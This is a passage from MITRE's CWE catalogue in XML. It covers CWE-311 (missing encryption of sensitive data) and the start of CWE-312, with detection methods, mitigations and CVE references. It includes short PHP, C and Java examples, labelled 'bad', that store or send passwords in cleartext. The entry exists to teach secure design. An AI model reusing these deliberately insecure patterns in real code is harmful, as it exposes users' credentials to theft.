               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">Authentication Issues</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Insufficient Authentication</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="311" Name="Missing Encryption of Sensitive Data" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software does not encrypt sensitive or critical information before storage or transmission.</Description>
         <Extended_Description>The lack of proper data encryption passes up the guarantees of confidentiality, integrity, and accountability that properly implemented encryption conveys.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>If the application does not use a secure channel, such as SSL, to exchange sensitive information, it is possible for an attacker with access to the network traffic to sniff packets from the connection and uncover the data. This attack is not technically difficult, but does require physical access to some portion of the network over which the sensitive data travels. This access is usually somewhere near where the user is connected to the network (such as a colleague on the company network) but can be anywhere along the path from the user to the end server.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>Omitting the use of encryption in any program which transfers data over a network of any kind should be considered on par with delivering the data sent to each user on the local networks of both the sender and receiver. Worse, this omission allows for the injection of data into a stream of communication between two parties -- with no means for the victims to separate valid data from invalid. In this day of widespread network attacks and password collection sniffers, it is an unnecessary risk to omit encryption from the design of any system which might benefit from it.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>The characterizaton of sensitive data often requires domain-specific understanding, so manual methods are useful. However, manual efforts might not achieve desired code coverage within limited time constraints. Black box methods may produce artifacts (e.g. stored data or unencrypted network transfer) that require manual evaluation.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Analysis</Method>
               <Description>Automated measurement of the entropy of an input/output source may indicate the use or lack of encryption, but human analysis is still required to distinguish intentionally-unencrypted data (e.g. metadata) from sensitive data.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Network Sniffer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Automated Monitored Execution</xhtml:li>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Clearly specify which data or resources are valuable enough that they should be protected by encryption. Require that any transmission or storage of this data/resource should use well-vetted encryption algorithms.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Ensure that encryption is properly integrated into the system design, including but not necessarily limited to:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:ul>
                        <xhtml:li>Encryption that is needed to store or transmit private data of the users of the system</xhtml:li>
                        <xhtml:li>Encryption that is needed to protect the system itself from unauthorized disclosure or tampering</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
                  <xhtml:p>Identify the separate needs and contexts for encryption:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:ul>
                        <xhtml:li>One-way (i.e., only the user or recipient needs to have the key). This can be achieved using public key cryptography, or other techniques in which the encrypting party (i.e., the software) does not need to have access to a private key.</xhtml:li>
                        <xhtml:li>Two-way (i.e., the encryption can be automatically performed on behalf of a user, but the key must be available so that the plaintext can be automatically recoverable by that user). This requires storage of the private key in a format that is recoverable only by the user (or perhaps by the operating system) in a way that cannot be recovered by others.</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
                  <xhtml:p>Using threat modeling or other techniques, assume that data can be compromised through a separate vulnerability or weakness, and determine where encryption will be most effective. Ensure that data that should be private is not being inadvertently exposed using weaknesses such as insecure permissions (CWE-732). [REF-7]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-24">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.</xhtml:p>
                  <xhtml:p>For example, US government systems require FIPS 140-2 certification.</xhtml:p>
                  <xhtml:p>Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.</xhtml:p>
                  <xhtml:p>Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-33">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
               <Effectiveness_Notes>This makes it easier to spot places in the code where data is being used that is unencrypted.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-40">
               <Intro_Text>This code writes a user's login information to a cookie so the user does not have to login again later.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>function persistLogin($username, $password){<xhtml:div style="margin-left:10px;">
                        <xhtml:div>$data = array("username" =&gt; $username, "password"=&gt; $password);<xhtml:br/>setcookie ("userdata", $data);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.</Body_Text>
               <Body_Text>Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-41">
               <Intro_Text>The following code attempts to establish a connection, read in a password, then store it to a buffer.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>server.sin_family = AF_INET; hp = gethostbyname(argv[1]);<xhtml:br/>if (hp==NULL) error("Unknown host");<xhtml:br/>memcpy( (char *)&amp;server.sin_addr,(char *)hp-&gt;h_addr,hp-&gt;h_length);<xhtml:br/>if (argc &lt; 3) port = 80;<xhtml:br/>else port = (unsigned short)atoi(argv[3]);<xhtml:br/>server.sin_port = htons(port);<xhtml:br/>if (connect(sock, (struct sockaddr *)&amp;server, sizeof server) &lt; 0) error("Connecting");<xhtml:br/>...<xhtml:br/>while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>write(dfd,password_buffer,n);<xhtml:br/>...<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-42">
               <Intro_Text>The following code attempts to establish a connection to a site to communicate sensitive information.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>URL u = new URL("http://www.secret.example.org/");<xhtml:br/>HttpURLConnection hu = (HttpURLConnection) u.openConnection();<xhtml:br/>hu.setRequestMethod("PUT");<xhtml:br/>hu.connect();<xhtml:br/>OutputStream os = hu.getOutputStream();<xhtml:br/>hu.disconnect();</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>catch (IOException e) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:div>
                              <xhtml:i>//...</xhtml:i>
                           </xhtml:div>
                        </xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-2272</Reference>
               <Description>password and username stored in cleartext in a cookie</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2272</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1466</Reference>
               <Description>password stored in cleartext in a file with insecure permissions</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1466</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0152</Reference>
               <Description>chat program disables SSL in some circumstances even when the user says to use SSL.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0152</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1603</Reference>
               <Description>Chain: product uses an incorrect public exponent when generating an RSA key, which effectively disables the encryption</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0964</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6157</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6828</Reference>
               <Description>product stores a password in cleartext in memory</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1567</Reference>
               <Description>storage of a secret key in cleartext in a temporary file</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1567</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0174</Reference>
               <Description>SCADA product uses HTTP Basic Authentication, which is not encrypted</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5778</Reference>
               <Description>login credentials stored unencrypted in a registry key</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5778</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1949</Reference>
               <Description>Passwords transmitted in cleartext.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1949</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4122</Reference>
               <Description>Chain: Use of HTTPS cookie without "secure" flag causes it to be transmitted across unencrypted HTTP.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4122</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3289</Reference>
               <Description>Product sends password hash in cleartext in violation of intended policy.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3289</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4390</Reference>
               <Description>Remote management feature sends sensitive information including passwords in cleartext.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4390</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5626</Reference>
               <Description>Backup routine sends password in cleartext in email.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5626</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1852</Reference>
               <Description>Product transmits Blowfish encryption key in cleartext.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0374</Reference>
               <Description>Printer sends configuration information, including administrative password, in cleartext.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0374</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4961</Reference>
               <Description>Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294).</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4961</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4786</Reference>
               <Description>Product sends passwords in cleartext to a log server.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4786</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3140</Reference>
               <Description>Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3140</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Failure to encrypt data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Cryptographic Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A9</Entry_ID>
               <Entry_Name>Insecure Communications</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>4</Entry_ID>
               <Entry_Name>Insufficient Transport Layer Protection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT Java Secure Coding">
               <Entry_ID>MSC00-J</Entry_ID>
               <Entry_Name>Use SSLSocket rather than Socket for secure data exchange</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="155"/>
            <Related_Attack_Pattern CAPEC_ID="157"/>
            <Related_Attack_Pattern CAPEC_ID="158"/>
            <Related_Attack_Pattern CAPEC_ID="204"/>
            <Related_Attack_Pattern CAPEC_ID="258"/>
            <Related_Attack_Pattern CAPEC_ID="259"/>
            <Related_Attack_Pattern CAPEC_ID="260"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="37"/>
            <Related_Attack_Pattern CAPEC_ID="383"/>
            <Related_Attack_Pattern CAPEC_ID="384"/>
            <Related_Attack_Pattern CAPEC_ID="385"/>
            <Related_Attack_Pattern CAPEC_ID="386"/>
            <Related_Attack_Pattern CAPEC_ID="387"/>
            <Related_Attack_Pattern CAPEC_ID="388"/>
            <Related_Attack_Pattern CAPEC_ID="389"/>
            <Related_Attack_Pattern CAPEC_ID="477"/>
            <Related_Attack_Pattern CAPEC_ID="65"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Protecting Secret Data&#34; Page 299"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 17: Failure to Protect Stored Data.&#34; Page&#xA;                  253"/>
            <Reference External_Reference_ID="REF-265"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Encryption&#34;, Page&#xA;                  43."/>
            <Reference External_Reference_ID="REF-267"/>
         </References>
         <Notes>
            <Note Type="Relationship">There is an overlapping relationship between insecure storage of sensitive information (CWE-922) and missing encryption of sensitive information (CWE-311). Encryption is often used to prevent an attacker from reading the sensitive data. However, encryption does not prevent the attacker from erasing or overwriting the data.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">Failure to Encrypt Data</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-02-16">Failure to Encrypt Sensitive Data</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="312" Name="Cleartext Storage of Sensitive Information" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The application stores sensitive information in cleartext within a resource that might be accessible to another control sphere.</Description>
